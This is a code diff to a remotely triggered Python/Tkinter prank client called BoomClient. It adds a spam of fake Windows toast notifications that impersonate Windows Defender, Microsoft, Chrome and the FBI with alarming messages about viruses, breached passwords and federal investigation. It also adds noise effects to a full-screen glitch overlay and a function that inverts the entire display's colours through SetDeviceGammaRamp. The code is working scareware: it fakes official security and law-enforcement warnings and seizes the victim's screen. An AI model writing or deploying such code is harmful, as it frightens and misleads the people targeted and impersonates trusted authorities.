@@ -427,43 +427,79 @@ class BoomClient:
     def prank_fake_notify(self):
         self.root.after(0, self.update_debug, "Stage: Extra\nFake Notify")
         
-        # Create a borderless window mimicking a Windows 10/11 notification
-        notify = tk.Toplevel(self.root)
-        nw, nh = 360, 100
-        nx = self.screen_width - nw - 20
-        ny = self.screen_height - nh - 60
+        if hasattr(self, '_notify_spamming') and self._notify_spamming:
+            return  # already running
         
-        notify.geometry(f"{nw}x{nh}+{nx}+{ny}")
-        notify.overrideredirect(True)
-        notify.attributes('-topmost', True)
-        notify.config(bg="#1f1f1f")
+        self._notify_spamming = True
+        self._notify_count = 0
+        self._notify_max = random.randint(8, 12)
         
-        # Notifications list
+        # Notification message pool
         messages = [
             ("System Alert", "Your location has been shared with 12 contacts."),
             ("Security Center", "Root administrator has connected remotely."),
             ("OneDrive", "Uploading screenshot (1/1) to public folder..."),
-            ("Battery Warning", "Battery level critical (2%). Shutting down soon.")
+            ("Battery Warning", "Battery level critical (2%). Shutting down soon."),
+            ("Windows Defender", "⚠ 127 viruses detected. Your PC is at extreme risk!"),
+            ("Google Chrome", "Your saved passwords have been exposed in a data breach."),
+            ("Microsoft Account", "New sign-in from unknown device in Moscow, Russia."),
+            ("Camera Access", "Camera has been accessed by 3 unrecognized applications."),
+            ("FBI Cyber Division", "Your IP address is associated with suspicious activity."),
+            ("Bitcoin Miner", "⚠ 94% CPU usage detected from an unknown background process."),
+            ("Windows Update", "Critical security patch failed. System is vulnerable."),
+            ("FBI Alert", "This device has been flagged for review by federal authorities."),
         ]
-        title, text = random.choice(messages)
         
-        tk.Label(notify, text=title, font=("Segoe UI", 12, "bold"), fg="white", bg="#1f1f1f", anchor="w").place(x=15, y=10)
-        tk.Label(notify, text=text, font=("Segoe UI", 10), fg="#cccccc", bg="#1f1f1f", anchor="w", wraplength=330).place(x=15, y=40)
-        
-        def slide_in():
-            for i in range(20, -1, -2):
-                if not notify.winfo_exists(): return
-                notify.geometry(f"{nw}x{nh}+{nx}+{ny + (i * 5)}")
-                notify.update()
-                time.sleep(0.01)
-                
-        def close_notify():
-            try: notify.destroy()
-            except: pass
+        def spawn_notify():
+            if not self._notify_spamming or self.stop_flag:
+                self._notify_spamming = False
+                return
+            if self._notify_count >= self._notify_max:
+                self._notify_spamming = False
+                return
             
-        notify.after(10, slide_in)
-        notify.after(5000, close_notify)
-        self.windows.append(notify)
+            self._notify_count += 1
+            
+            # Create a borderless window mimicking a Windows 10/11 notification
+            notify = tk.Toplevel(self.root)
+            nw, nh = 360, 100
+            nx = self.screen_width - nw - 20
+            # Stack upwards from bottom-right, each notification higher
+            ny = self.screen_height - nh - 60 - (self._notify_count - 1) * (nh + 10)
+            
+            notify.geometry(f"{nw}x{nh}+{nx}+{ny}")
+            notify.overrideredirect(True)
+            notify.attributes('-topmost', True)
+            notify.config(bg="#1f1f1f")
+            
+            title, text = random.choice(messages)
+            
+            tk.Label(notify, text=title, font=("Segoe UI", 12, "bold"), fg="white", bg="#1f1f1f", anchor="w").place(x=15, y=10)
+            tk.Label(notify, text=text, font=("Segoe UI", 10), fg="#cccccc", bg="#1f1f1f", anchor="w", wraplength=330).place(x=15, y=40)
+            
+            def slide_in():
+                for i in range(20, -1, -2):
+                    if not notify.winfo_exists(): return
+                    try:
+                        notify.geometry(f"{nw}x{nh}+{nx}+{ny + (i * 5)}")
+                        notify.update()
+                        time.sleep(0.01)
+                    except tk.TclError:
+                        return
+                    
+            def close_notify():
+                try: notify.destroy()
+                except: pass
+                
+            notify.after(10, slide_in)
+            notify.after(5000, close_notify)
+            self.windows.append(notify)
+            
+            # Schedule next notification in 2-4 seconds (no sleep blocking)
+            delay = random.randint(2000, 4000)
+            self.root.after(delay, spawn_notify)
+        
+        spawn_notify()
 
     def on_ws_open(self, ws):
         client_info = self.get_client_info()
@@ -553,6 +589,7 @@ class BoomClient:
             "prank_flip_screen": self.prank_flip_screen,
             "prank_fake_update": self.prank_fake_update,
             "prank_glitch": self.prank_glitch,
+            "prank_negative": self.prank_negative,
             "prank_infinite_window": self.prank_infinite_window,
             "prank_ghost_typing": self.prank_ghost_typing,
             "prank_rickroll": self.prank_rickroll,
@@ -582,9 +619,12 @@ class BoomClient:
 
     def stop_prank(self):
         self.close_all_windows()
+        self._notify_spamming = False
         if self.screen_flipped:
             self.screen_flipped = False
             self.prank_flip_screen()
+        if hasattr(self, '_negative_active') and self._negative_active:
+            self.prank_negative()
         self.stage = 0
 
     def start_stage_1(self):
@@ -861,18 +901,44 @@ class BoomClient:
         
         def do_glitch():
             if self.stop_flag or self.stage != 8: return
-            for c in canvases:
+            for c, (mx, my, mw, mh) in zip(canvases, monitors):
                 try:
                     c.delete("all")
+                    
+                    # 1. Colored blocks (existing glitch rectangles)
                     for _ in range(30):
-                        x1 = random.randint(0, self.screen_width)
-                        y1 = random.randint(0, self.screen_height)
+                        x1 = random.randint(0, mw)
+                        y1 = random.randint(0, mh)
                         x2 = x1 + random.randint(50, 500)
                         y2 = y1 + random.randint(5, 50)
                         color = random.choice(["#ff0000", "#00ff00", "#0000ff", "#ffffff", "#000000"])
                         c.create_rectangle(x1, y1, x2, y2, fill=color, outline="")
+                    
+                    # 2. Snow noise — 500-1000 tiny black/white 1-2px dots
+                    for _ in range(random.randint(500, 1000)):
+                        sx = random.randint(0, mw)
+                        sy = random.randint(0, mh)
+                        ss = random.randint(1, 2)
+                        sc = random.choice(["#ffffff", "#000000"])
+                        c.create_rectangle(sx, sy, sx + ss, sy + ss, fill=sc, outline="")
+                    
+                    # 3. RGB chromatic aberration — same content in R/G/B with offsets
+                    #    Red left 3px, Green centered, Blue right 3px
+                    for _ in range(25):
+                        rx1 = random.randint(0, mw)
+                        ry1 = random.randint(0, mh)
+                        rx2 = rx1 + random.randint(80, 400)
+                        ry2 = ry1 + random.randint(8, 40)
+                        # Red channel (shifted left)
+                        c.create_rectangle(rx1 - 3, ry1, rx2 - 3, ry2, fill="#ff0000", outline="")
+                        # Green channel (centered)
+                        c.create_rectangle(rx1, ry1, rx2, ry2, fill="#00ff00", outline="")
+                        # Blue channel (shifted right)
+                        c.create_rectangle(rx1 + 3, ry1, rx2 + 3, ry2, fill="#0000ff", outline="")
+                        
                 except tk.TclError:
                     pass
+            # Window jitter
             offset_x = random.randint(-10, 10)
             offset_y = random.randint(-10, 10)
             for w, (mx, my, mw, mh) in zip(glitch_windows, monitors):
@@ -887,6 +953,37 @@ class BoomClient:
                     pass
         
         do_glitch()
+
+    def prank_negative(self):
+        """Invert screen colors using SetDeviceGammaRamp (toggle on/off)."""
+        self.root.after(0, self.update_debug, f"Stage: Extra\nNegative Mode")
+        import ctypes
+        class GAMMA_RAMP(ctypes.Structure):
+            _fields_ = [("red", ctypes.c_ushort * 256),
+                        ("green", ctypes.c_ushort * 256),
+                        ("blue", ctypes.c_ushort * 256)]
+
+        if not hasattr(self, '_negative_active'):
+            self._negative_active = False
+
+        ramp = GAMMA_RAMP()
+        if not self._negative_active:
+            # Invert colors
+            for i in range(256):
+                ramp.red[i] = (255 - i) * 257
+                ramp.green[i] = (255 - i) * 257
+                ramp.blue[i] = (255 - i) * 257
+        else:
+            # Restore normal colors
+            for i in range(256):
+                ramp.red[i] = i * 257
+                ramp.green[i] = i * 257
+                ramp.blue[i] = i * 257
+
+        hdc = ctypes.windll.user32.GetDC(0)
+        ctypes.windll.gdi32.SetDeviceGammaRamp(hdc, ctypes.byref(ramp))
+        ctypes.windll.user32.ReleaseDC(0, hdc)
+        self._negative_active = not self._negative_active
 
     def prank_infinite_window(self):
         self.close_all_windows()
